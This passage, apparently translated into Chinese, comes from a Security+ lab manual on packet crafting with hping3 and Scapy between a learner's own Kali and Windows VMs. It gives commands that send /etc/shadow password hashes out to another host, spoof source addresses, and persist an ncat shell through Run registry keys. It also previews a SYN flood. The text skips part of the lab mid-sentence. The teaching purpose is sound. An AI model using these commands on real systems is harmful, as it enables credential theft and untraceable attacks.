  \ Linux 虚拟机的 Windows 命令提示符下，输入以下内容：\n\n  ```\n  ping 8.8.8.8\n  ```\n\n  实际上，你现在是通过\
  \ Kali Linux 虚拟机从 Windows 10 虚拟机发送 ping。回复将发送到 Windows 10 虚拟机！\n\n  这种发送和接收的能力可以被用于许多恶意目的，包括使受害机器访问会投递恶意软件的系统，以及通过伪造归属使受害机器看起来是攻击的真正发起者。\n\
  \n  按 CTRL-C 退出 Kali Linux 中的 cmd.exe Shell。\n\n这种 ncat Shell 创建方式（如图 16-26 所示）甚至可以通过将其添加到受害机器注册表的以下位置之一来实现持久化：\n\
  \n- `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- `HKEY_CURRENT_USER\\\
  Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- `HKEY_LOCAL_MACHINE\\Software\\\
  Microsoft\\Windows\\CurrentVersion\\RunOnce`\n- `HKEY_CURRENT_USER\\Software\\Microsoft\\\
  Windows\\CurrentVersion\\RunOnce`\n\n- e. 现在是时候互换角色，并使用 Kali Linux 虚拟机中的 Bash 了。\n\
  \n在本实验练习中，你将通过多种方式使用 hping3，这些方式可能是有益的也可能是有害的。完成本实验练习后，你将能够：\n\n- 使用 hping3 构建并发送包含各种协议的数据包\n\
  - 使用 hping3 探测机器，这比传统的 ICMP ping 更具优势\n- 封装秘密负载以渗入或渗出数据\n- 在 Wireshark 中分析和解读结果\n\
  \n## 实验材料和设置\n\n本实验所需的材料有：\n\n- *《计算机安全原理：CompTIA Security+ 及进阶》* 教科书\n- 你在第 1 章中创建的\
  \ Kali Linux 虚拟机\n- 你在第 1 章中创建的 Windows 10 虚拟机\n- 可连接互联网的 Web 浏览器\n\n## 开始操作！\n\n\
  在 Windows 10 虚拟机上，关闭 Windows Defender 防火墙。\n\n在 Windows 10 虚拟机上，在 Wireshark 中使用显示过滤器\
  \ **ip.addr==** 后跟 Kali Linux 虚拟机的 IP 地址开始嗅探。定位并分析相关流量。\n\n每输入一条命令后按 ENTER 键。\n\n\
  1a–1e\n\n### 第 1 步 使用 hping3 发送带有自定义负载的流量，包括 /etc/shadow 文件的内容。\n\n- a. 在 Kali Linux\
  \ 中，输入 `man hping3` 查看该工具的信息。\n\n- b. 输入以下命令，使用 hping3 发送一个带有默认设置的数据包：\n\n  ```\n\
  \  sudo hping3 -c 1 192.168.1.108\n  ```\n\n  （替换为 Windows 10 虚拟机的 IP 地址。）\n\n \
  \ 以下是来自 hping3 手册页（https://linux.die.net/man/8/hping3）的内容：\n\n  `-c --count count`\n\
  \n  在发送（和接收）count 个响应数据包后停止。在最后一个数据包发送后，hping3 会等待 `COUNTREACHED_TIMEOUT` 秒以接收目标主机的回复。你可以通过编辑\
  \ `hping3.h` 来调整 `COUNTREACHED_TIMEOUT`。\n\n  默认情况下，hping3 使用 TCP，源端口号随机，目标端口号为\
  \ 0，这保证该端口在目标机器上不会开放。虽然端口 0 被定义为无效端口号，但仍然可以向端口 0 发送流量并从端口 0 接收流量。额外的好处是，发送到端口 0\
  \ 的 TCP 段很可能不会出现在日志文件中，因此保持隐蔽的机会更大。\n\n- c. 输入以下命令，使用带有自定义负载的 hping3：\n\n  ```\n\
  \  sudo hping3 -c 1 192.168.1.108 -e \"CompTIA Security+\"\n  ```\n\n  （替换为 Windows\
  \ 10 虚拟机的 IP 地址。）\n\n  输出应如图 16-30 所示，在 Wireshark 中应看到的内容参见图 16-31。\n\n  ![](img/6e921d997751f0a0f87e5170ac9657a1_596_0.png)\n\
  \n**图 16-30** hping3 输出\n\n![](img/6e921d997751f0a0f87e5170ac9657a1_597_0.png)\n\
  \n**图 16-31** 使用 hping3 发送的消息 CompTIA Security+\n\n以下是来自 hping3 手册页的内容：\n\n`-e --sign\
  \ signature`\n\n用 *signature* 填充数据的前 *signature length* 个字节。如果 *signature length*\
  \ 大于数据大小，则会显示错误消息。如果你未指定数据大小，hping3 将使用签名大小作为数据大小。此选项可以安全地与 `--file filename` 选项一起使用；数据空间的剩余部分将使用\
  \ *filename* 填充。\n\n现在你可以封装自己的负载了。这种用法的一个很好的场景是攻击者与受害系统上的恶意软件之间的隐蔽通信。攻击者可以用这种方法向恶意软件发出命令，这些命令会混入正常的\
  \ TCP 流量中，然后被恶意软件读取并执行。\n\n- d. 创建和发送数据是一回事；渗出数据则是另一回事。\n\n以下是来自 hping3 手册页的内容：\n\
  \n`-d --data data size`\n\n设置数据包主体大小。警告：使用 `--data 40` 时，hping3 不会生成 0 字节的数据包，而是生成\
  \ protocol_header + 40 字节的数据包。hping3 会将数据包大小信息显示为输出的第一行，如下所示：\n\n**HPING www.yahoo.com\
  \ (ppp0 204.71.200.67): NO FLAGS are set, 40 headers + 40 data bytes**\n\n`-E --file\
  \ filename`\n\n使用 *filename* 的内容填充数据包的数据。\n\n输入\n\n```\nls -l /etc/shadow\n```\n\
  \n查看包含密码哈希的 /etc/shadow 文件有多大。\n\n### 交叉引用\n\n你在第 5 章和第 11 章中针对 /etc/shadow 文件进行了实验练习。你在第\
  \ 2 章中进行了使用 `ls -l` 的实验练习。\n\n以下是我得到的输出：\n\n```\n-rw-r----- 1 root shadow 3592 Jul\
  \ 20 17:04 /etc/shadow\n```\n\n时间戳前面的数字是文件大小（以字节为单位）。在我的例子中，是 3592 字节。\n\n- e. 输入以下命令，指定合适的\
  \ /etc/shadow 文件负载大小，以窃取密码哈希：\n\n  ```\n  sudo hping3 -c 1 192.168.1.108 -d 3592\
  \ -E /etc/shadow\n  ```\n\n  （替换为 Windows 10 虚拟机的 IP 地址，并替换为你自己的 /etc/shadow 文件的大小。）\n\
  \n  你会在 Windows 10 虚拟机的 Wireshark 中注意到，数据包被分片了。检查负载并在 Wireshark 中找到 /etc/shadow\
  \ 文件的各个部分。\n\n2a–2h\n\n### 第 2 步 使用 hping3 发送带有多种协议自定义负载的流量。\n\n- a. 输入以下命令，发送 UDP（而不是默认的\
  \ TCP），并带有自定义负载：\n\n  ```\n  sudo hping3 -c 1 192.168.1.108 -e \"FLCC\" -2\n  ```\n\
  \n  （替换为 Windows 10 虚拟机的 IP 地址。）\n\n  `-2` 选项指定使用 UDP。与 TCP 作为第 4 层协议时一样，再次使用端口\
  \ 0。\n\n  在 Wireshark 中查找“FLCC”。\n\n- b. 输入以下命令，发送 ICMP（而不是默认的 TCP），并带有自定义负载：\n\n\
  \  ```\n  sudo hping3 -c 1 192.168.1.108 -e \"RIT\" -1\n  ```\n\n  （替换为 Windows\
  \ 10 虚拟机的 IP 地址。）\n\n  `-1` 选项指定使用 ICMP。由于 ICMP 是第 3 层协议，而端口存在于第 4 层，因此发送的是 ICMP\
  \ 回显请求（类型 8），而不是目标端口为 0 的 TCP 段或 UDP 数据报。\n\n  与历史悠久的 ping 工具相比，使用带 ICMP 的 hping3\
  \ 更具优势，因为你可以指定其他 ICMP 负载以及其他类型和代码，而不是使用操作系统在 ping 工具中所选择的默认值。\n\n  在 Wireshark 中查找“RIT”。\n\
  \n- c. 你会注意到，在 Wireshark 的数据包详情窗格（中间窗格）中，IP 头（单击任何数据包中“Internet Protocol Version\
  \ 4”旁边的箭头即可查看）包含一个名为 Protocol 的字段，该字段以类似方式标识 IP 数据包中封装的上层协议（最常见的是 ICMP、TCP 和 UDP），就像以太网帧的\
  \ Type 字段（单击 Ethernet II 旁边的箭头即可查看）标识以太网帧内部的内容（最常见的是 ARP 或 IP）一样。Wireshark 会显示以太网帧格式，即使你在使用\
  \ 802.11 帧的 Wi-Fi 上也是如此。\n\n\n\n\n\n每个协议都由一个协议号标识。不要将协议号与端口号混淆。端口号标识程序和服务的连接端点，例如\
  \ 53 代表 DNS。协议号标识封装在 IP 头中的协议。最常见的协议号是 1（ICMP）、6（TCP）和 17（UDP）。你可以在 https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml\
  \ 查看完整列表。\n\n在 Wireshark 中，找到你从 Kali Linux VM 发送的 ICMP 回显请求中协议号字段值为 1 的位置。\n\nd.\
  \ 输入以下命令以使用原始 IP 模式，这正是 -0 选项所指定的：\n\n```\nsudo hping3 -c 1 192.168.1.108 -e \"\
  Syracuse University\" -0\n```\n\n（将 IP 地址替换为 Windows 10 VM 的 IP 地址。）\n\n与到目前为止 TCP、UDP\
  \ 和 ICMP 的情况不同，你没有在 Layer 3 数据包内指定任何要包含的内容。相反，你直接将数据放入 IP 数据包中，而不考虑正确的头部和值。\n\n\
  在 Wireshark 中找到 “Syracuse University”。你会注意到，“Syracuse University” 正被误解为 TCP 头的字节，从源端口和目标端口字段开始。在\
  \ Wireshark 的数据包详情窗格（中间窗格）中单击 TCP 部分中的源端口字段，该字段显示源端口为 21369。你会注意到，在数据包字节窗格（底部窗格）中，左侧的十六进制转储突出显示了\
  \ 53 79，右侧的 ASCII 部分突出显示了 Sy（来自 Syracuse 的有效载荷）。如 https://www.asciitable.com 所示，S\
  \ 的基 16（十六进制）值为 53，y 的基 16（十六进制）值为 79。将基 16（十六进制）值 5379 转换为基 10（十进制）得到 21369，这就是\
  \ Wireshark 将 21369 显示为源端口的原因。同样的逻辑也适用于 ra（来自 Syracuse 的有效载荷），其十六进制为 7261，十进制为 29281，这正是目标端口字段显示的值。\n\
  \nWireshark 会提示这是一个畸形数据包，因为 TCP 头的最后一个字段“紧急指针”（Urgent Pointer）无法由字符串 “Syracuse University”\
  \ 的长度来表示。\n\n如果你使用 “Syracuse University, New York,” 作为有效载荷，你将填满该头部，并在末尾多出 8 个字节，这些字节会被误认为是\
  \ TCP 选项，因此不会出现畸形数据包消息。但是，你会注意到紧急指针字段（现在出现在 Wireshark 的这个 TCP 头中）的值为 31020，这会导致\
  \ Wireshark 显示另一条消息：“78 bytes says option goes past end of options.”\n\ne. 输入以下命令，发送比上一条命令更少的字节：\n\
  \n```\nsudo hping3 -c 1 192.168.1.108 -e \"Syracuse\" -0\n```\n\n（将 IP 地址替换为 Windows\
  \ 10 VM 的 IP 地址。）\n\n注意，在 Wireshark 中，当只发送 “Syracuse” 时，只会显示源端口和目标端口字段，因为这次 Wireshark\
  \ 用来填充其余字段的字节更少（没有空白字符，十六进制数字 20 表示空白，也没有 University 这个词）。\n\nf. 输入以下命令，在原始 IP 模式下使用\
  \ UDP：\n\n```\nsudo hping3 -c 1 192.168.1.108 -e \"Nazareth College\" -0 -H 17\n\
  ```\n\n（将 IP 地址替换为 Windows 10 VM 的 IP 地址。）\n\n以下内容来自 hping3 手册页：\n\n- `-H --ipproto`\
  \  \n  在原始 IP 模式下设置 IP 协议。\n\n如前所述，17 是 UDP 的协议号。\n\nWireshark 仍然不满意，因为它期望的是一个 UDP\
  \ 数据报及其相应的字段和值位于通常的位置。\n\n在 Wireshark 中找到 “Nazareth College”。\n\n如果仔细观察，在 Wireshark\
  \ 中，“Nazareth” 的字节被解释为 8 字节的 UDP 头，而空白字符和 7\n\n每个发送的数据包的编号。收到数据包时，序列号可计算为 *replies.dest.port\
  \ - base.source.port*。默认基础源端口是随机的，使用此选项可以设置不同的数字。如果你希望源端口不随每个发送的数据包递增，请使用 *-k --keep*\
  \ 选项。\n\n在 Wireshark 中按 **tcp.port==536** 过滤。\n\nd. 输入以下命令，使用 hping3 伪造源端口、目标端口和源\
  \ IP 地址：\n\n```\nsudo hping3 -c 1 192.168.1.108 -s 536 -p 9999 --rand-source\n```\n\
  \n（将 IP 地址替换为 Windows 10 VM 的 IP 地址。）\n\n以下内容来自 hping3 手册页：\n\n- `-p --destport\
  \ [+] [+] dest port`  \n  设置目标端口，默认为 0。如果目标端口号前有 ‘+’ 字符（例如 +1024），则每收到一个回复，目标端口就会递增。如果目标端口号前有两个\
  \ ‘+’（例如 ++1024），则每发送一个数据包，目标端口就会递增。默认情况下，可以使用 **CTRL+z** 交互式地修改目标端口。\n\n在 Wireshark\
  \ 中按 **tcp.port==536** 过滤。\n\n这对于通过某个端口上的易受攻击服务向目标机器发送流量非常有用，且不会留下任何关于源 IP 地址或源端口的归属信息。\n\
  \n30 分钟\n\n## 实验 16.04：使用 Scapy 进行数据包构造\n\n如果你觉得用 hping3 构造数据包很巧妙，那么等你看完 Scapy 能做什么再说吧！与\
  \ hping3 由在终端输入的命令组成不同，Scapy 使用 Python 接口来构造和发送数据包。Scapy 允许你输入单个命令，甚至可以编写脚本。在 https://scapy.net/\
  \ 上了解更多关于 Scapy 的信息。\n\n同样的主题仍在继续：这个工具既可以用于正当目的，也可以用于恶意目的。\n\n### 学习目标\n\n在本实验中，你将使用\
  \ Scapy 构造数据包。完成本实验后，你将能够：\n\n- 使用 Scapy 构造并发送包含各种协议的数据包\n- 执行 SYN 洪泛攻击，并理解攻击者如何利用\
  \ TCP 发起拒绝服务（DoS）攻击\n- 使用 Wireshark 解读结果\n\n### 实验材料和设置\n\n本实验所需的材料有：\n\n- *《计算机安全原理：CompTIA\
  \ Security+ 及进阶》* 教材\n- 你在第 1 章创建的 Kali Linux VM\n- 你在第 1 章创建的 Windows 10 VM\n-\
  \ 可连接互联网的 Web 浏览器\n\n### 让我们开始吧！\n\n在 Kali Linux VM 上，打开一个终端。\n\n在 Windows 10 VM\
  \ 上，关闭 Windows Defender 防火墙。\n\n在 Windows 10 VM 上，在 Wireshark 中使用显示过滤器 **icmp**\
  \ 开始抓包。定位并分析相关流量。\n\n确保你的语法正确。缺少一个括号或斜杠（或多加一个）都可能导致错误。Python 同样区分大小写。要退出 Scapy 中的任何操作，请按\
  \ CTRL-C。在每条命令或函数调用后按 ENTER 键。\n\n![](img/6e921d997751f0a0f87e5170ac9657a1_605_0.png)\n\
  \n### 步骤 1：使用 Scapy 发送自定义 ICMP 回显请求\n\na. 按如下方式启动 Scapy：\n\n```\nsudo scapy\n```\n\
  \n如果出现 “Can’t import PyX. Won’t be able to use psdump() or pdfdump()” 消息，请忽略它。\n\
  \nb. 调用 **exit()** 函数退出 Scapy：\n\n```\nexit()\n```\n\nc. 在 Kali Linux VM 上，再次启动\
  \ Scapy。\n\nd. 在 Scapy 提示符下，输入以下命令，使用 **send()** 函数发送一个 IP 数据包，该数据包由 **IP()** 函数创建，内部包含一个由\
